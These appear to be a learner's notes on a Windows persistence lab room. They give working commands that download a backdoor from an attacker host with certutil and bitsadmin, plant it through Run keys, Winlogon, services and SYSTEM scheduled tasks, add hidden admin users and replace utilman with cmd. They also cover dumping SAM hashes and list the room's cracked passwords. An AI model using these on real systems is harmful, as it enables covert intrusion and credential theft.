@@ -1,0 +1,227 @@
+
+
+Persistence
+============
+
+Well this room demonstrates the 4th phase of hacking i.e. Maintaining Access. Tbh, it's one of the first times I am learning something like this.
+
+- Persistence is a post exploitation activity.
+
+- Persistence can be of 2 types: 
+	- Low privileged
+		- This is where a pentester gains access as a normal user, and maintains this access for a later login.
+	- Privileged User
+		- It's always a possibility that the pentester who gained access to a system WILL GO FOR A PRIVILEGE ESCALATION... Now, rather than doing the whole process all over again, he would want to maintain his access at this point of time, like a checkpoint
+
+Note: Persistence can be taken as a checkpoint of the access that the attacker has managed to gain.
+
+Ways of keeping persistence
+============================
+
+    Startup folder persistence
+    Editing registry keys
+    Using scheduled tasks
+    Using BITS
+    Creating a backdoored service
+    Creating another user
+    Backdooring RDP
+
+Note: By the above cases you should have identified that this is windows based.
+
+Low Privilege user persistence
+================================
+
+- After a paragraph on how to create a backdoor with msfvenom (windows shell reverse_tcp) there are 3 ways given on how you can transfer the backdoor to the host machine...
+
+Delivery Method 1
+------------------
+
+Internet Options in Internet Explorer, add your IP to trusted IPs and then go to the http://attackerIP/ and download the file, via there
+
+- This method is useful when dealing with RDP sessions... But if you don't have graphical access to a site... Then use the other 2
+
+Deliver Method 2
+------------------
+
+- Invoke-WebRequest in powershell and outfile the contents... Easily.
+
+Note: Windows\temp directory is world writable
+
+Delivery Method 3
+------------------
+
+- This is something new... i.e. use of certutils. The command is as follows... 
+
+	certutil -urlcache -split -f http://attackerIP/backdoor.exe
+
+- This method is useful when you cannot use powershell or just want to be sure that you do this correct... This works on both, windows command line and powershell.
+
+Startup Folder Persistence
+----------------------------
+
+Enough with the crap... Let's start with the ways of persistence.
+
+- So you can put the backdoor in startup folder... The path to the startup folder is in
+
+	C:\Users\%usersname%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+In this way, whenever the user logs into his account the reverse shell will get activated.
+
+Editing Registries
+--------------------
+
+Depending on the registry entries the attacker can add an entry(if allowed to the current logged in user)
+	- This method is when attacker can't add the backdoor in startup folder the attacker can run the reg add command to add a new variable for our backdoor in registry so that whenever the user logs in... The backdoor gets activated
+
+	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\Users\%username%\AppData\Roaming\backdoor.exe"
+
+Now, whenever the user logs in the backdoor exe in the roaming folder will get executed.
+
+BITS JOB
+----------
+
+BITS (Background Intelligent Transfer Service) is used for transferring files when their is network bandwidth left for idle.
+
+- BITS jobs are containers (starting with no files in them) and source and destination of file needs to be specified for the job to work. 
+	- You can view the BITS help menu with the command: bitsadmin
+
+	Creating a job
+	---------------
+
+	bitsadmin /create backdoor (creation)
+
+	bitsadmin /addfile backdoor "http://attackerIP/backdoor.exe" "C:\Users\tryhackme\Documents\backdoor.exe" (Adding source and destination files)
+
+	bitsadmin /SetNotifyCmdLine 1 cmd.exe "/c bitsadmin.exe /complete backdoor | start /B C:\Users\%username%\Documents\backdoor.exe"
+		=> unable to find job named 1
+
+Since we want our backdoor to be persistent let's set a retry delay job...
+	
+	bitsadmin /SetMinRetryDelay backdoor 30
+
+To start the job immidiately... 
+	bitsadmin /resume
+
+
+NOTE: BITS IS VERY UNSTABLE AND CAN AND MIGHT GIVE YOU JUST TEMPORARY PERSISTENCE, BECAUSE OF IT DELAY AND RECALLING OF THE JOB, AND THEN CONTINUOUSLY STOPPING THE JOB OVER THE HOST TO IGNORE THAT... IT'S A LOT OF WORK WITH LONG COMMANDS SO JUST TRY TO AVOID THIS METHOD.
+
+HIGH PRIVILEGE USER PERSISTENCE
+=================================
+
+Creating another admin user
+-----------------------------
+
+	net user /add <user> <password>
+
+	net localgroup Administrators <user> /add (adding the user to the administrators group)
+
+You can recheck your user if it has been successfully added to the admin group or not.
+	
+	net localgroup Administrators
+
+Editing Registries
+--------------------
+
+	reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, <PATH TO BINARY>" /f
+
+So whenever the admin user logs in the userinit.exe will run the backdoor in the specified path.
+
+Persistence by creating a service
+-----------------------------------
+
+We can create a persistent service (as you know most of the services start when the OS boots up; So we are gonna add our service to the start at boot up)
+
+	New-Service -Name "<Service Name>" -BinaryPathName "<path to binary>" -Description "<service description>" -StartupType "Boot"
+
+So, whenever the system starts our binary will kick in automatically.
+
+Scheduled Tasks
+----------------
+
+Another cool technique we can use to persist our access is to run the binary as a cron job in windows.
+
+- Powershel can be used to create the schtasks but for that we need to configure few things... These things are:
+	
+	- New-ScheduledTaskAction
+    - New-ScheduledTaskTrigger
+    - New-ScheduledTaskPrincipal
+    - New-ScheduledTaskSettingsSet
+    - Register-ScheduledTask
+
+New-ScheduledTaskAction - Is used to set what action will be taken place.
+
+New-ScheduledTaskTrigger - This is the time/condition that when met, will perform the above mentioned action.
+
+New-ScheduledTaskPrincipal - Is to specify, that with which user's privileges the action will be taken
+
+New-ScheduledTaskSettingsSet - This is the cmdlet used to set the above show settings for final
+
+Register-ScheduledTask - This is to register scheduled task that we configured above with a name and further arguments.
+
+Commands:
+	$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Administrators\Desktop\backdoor.exe"
+
+	$B = New-ScheduledTaskTrigger -AtLogOn
+
+	$C = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -RunLevel Highest
+
+	$D = New-ScheduledTaskSettingsSet
+
+	$E = New-ScheduledTask -Action $A -Trigger $B -Principal $C -Settings $D
+
+	Register-ScheduledTask Backdoor -Input Object $E
+
+This will create the scheduled task finally.
+
+Backdooring RDP
+-----------------
+
+Again, this is something, you wanna avoid... This is just eye friendly drag and drop... But still this don't have power of SYSTEM (#Admin access only)
+
+- An example would be using Metasploit to backdoor OSK (On-screen keyboard).
+
+	Metasploit sticky_keys module can be used:
+		post/windows/manage/sticky_keys
+
+
+	set TARGET OSK
+
+	run
+
+	- Sign out/Lock the account and press Windows Key + U and choose On-screen keyboard. A CMD should be prompted.
+
+- The same results can be achieved by editing the registry using the command:
+
+	REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
+
+Hash Dumping
+=============
+
+No need for introduction.
+
+Download the SAM and SYSTEM files and then use samdump2 on them to dump them into their password hashes.
+	
+	NOTE: TO DOWNLOAD THOSE FILES YOU CAN CHANGE THEIR LOCATION TO DESKTOP IN THE REGISTRIESSSSS... 
+
+	reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
+
+	reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SAM
+
+- Ofcourse you need admin privs for them.
+
+Note: When you do the file dump on local attacker machine... You might notice that some user's aren't showing with their username only with their password hashes, that's a case where user's are disabled on the system. 
+	- To find those users you can query the system with net user command(if not sure just google it).
+
+- In metasploit use mimikatz(kiwi)
+
+Note: Recommended password wordlist in seclists:
+	
+	/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
+
+
+
+Chris Decrypted NTLM?
+	mypass123
+
+Joe Decrypted NTLM?
+	secret
